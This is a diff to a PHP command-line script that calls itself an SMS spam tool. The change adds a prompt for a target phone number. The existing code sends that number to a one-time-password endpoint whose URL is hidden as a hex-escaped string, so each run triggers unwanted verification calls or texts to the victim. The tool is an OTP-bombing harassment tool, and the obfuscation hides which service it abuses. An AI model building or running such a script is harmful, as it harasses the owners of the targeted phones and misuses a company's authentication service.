@@ -72,6 +72,8 @@ echo $YY."\n::#: #";
 echo $B."\n::###############################################".$G.$X."\n\n";
 
 isset($argv[1]) OR die($RR."[!] []== Input Namber plish ==[] [!]\n".$X);
+echo "\n\e[36mNo Target : ";
+$no = trim(fgets(STDIN, 1024));
 if(is_numeric($argv[1])) {
 	echo "[]Prossesing Spam SmS[] #".$G.$argv[1].$X."\n";
 	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[1]."&accept=call");
